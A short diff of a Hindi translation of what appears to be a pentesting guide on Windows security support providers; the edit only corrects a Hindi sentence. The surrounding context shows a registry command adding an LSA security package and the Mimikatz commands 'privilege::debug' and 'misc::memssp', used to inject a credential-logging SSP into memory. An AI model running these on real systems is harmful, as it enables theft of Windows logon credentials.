@@ -26,7 +26,7 @@ reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 
 #### मेमोरी में
 
-आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता):
+आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता है):
 ```powershell
 privilege::debug
 misc::memssp
